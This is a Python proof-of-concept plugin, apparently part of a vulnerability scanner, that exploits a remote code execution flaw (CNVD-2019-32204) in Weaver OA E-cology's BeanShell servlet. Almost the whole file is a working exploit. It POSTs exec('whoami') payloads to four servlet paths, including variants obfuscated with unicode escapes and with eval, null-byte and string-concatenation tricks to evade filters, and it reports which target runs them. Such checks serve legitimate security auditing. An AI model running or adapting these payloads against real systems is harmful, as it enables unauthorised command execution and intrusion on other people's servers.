#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

"""
泛微OA E-cology 远程代码执行漏洞 CNVD-2019-32204
"""
from lib.core.Request import request
from plugin.target_parse import get_standard_url

url_payload1 = "/bsh.servlet.BshServlet"
url_payload2 = "/weaver/bsh.servlet.BshServlet"
url_payload3 = "/weaveroa/bsh.servlet.BshServlet"
url_payload4 = "/oa/bsh.servlet.BshServlet"
data_payload1 = """bsh.script=exec("whoami");&bsh.servlet.output=raw"""
data_payload2 = """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
data_payload3 = """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""

def poc(url):
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    target = get_standard_url(url)
    for url_payload in (url_payload1, url_payload2, url_payload3, url_payload4):
        url = target + url_payload
        for data_payload in (data_payload1, data_payload2, data_payload3):
            try:
                res = request.post(url, data=data_payload, headers=headers, timeout=5, allow_redirects=False)
                if res.status_code == 200 and ";</script>" not in res.text\
                and "Login.jsp" not in res.text and "Error" not in res.text:
                        return url + "\tpayload:" + data_payload
            except:
                pass
    return False
